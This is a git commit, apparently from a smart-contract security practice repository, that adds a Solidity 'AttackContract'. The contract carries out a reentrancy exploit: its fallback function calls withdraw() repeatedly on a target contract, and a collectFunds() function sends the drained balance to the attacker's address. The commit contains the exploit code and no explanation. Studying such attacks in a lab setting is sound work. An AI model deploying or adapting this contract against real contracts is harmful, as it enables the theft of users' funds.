daa9c8d007cf31d318b0d4777486db4115755496
MihRazvan <razvan.mihailescu1996@gmail.com>
2024-03-14 00:28:34 +0200

    cleared repo + created first contract to be exploited

---
+++ contracts/AttackContract.sol
@@ -0,0 +1,38 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8;
+
+interface IVulnerableContract {
+    function deposit() external payable;
+    function withdraw() external payable;
+}
+
+contract AttackContract {
+
+    IVulnerableContract public vulnerableContract;
+    address owner;
+
+    constructor (address _vulnerableAddress) {
+        vulnerableContract = IVulnerableContract(_vulnerableAddress);
+        owner = msg.sender;
+    }
+
+    fallback() external payable {
+        vulnerableContract.withdraw();
+    }
+
+    function attack() public {
+        if (msg.sender != owner) {
+            revert("Not owner!");
+        }
+        vulnerableContract.deposit();
+        vulnerableContract.withdraw();
+    }
+
+    function collectFunds() external {
+        if (msg.sender != owner) {
+            revert("Not owner!");
+        }
+        (bool sent, ) = owner.call{value: address(this).balance}("");
+    }
+}
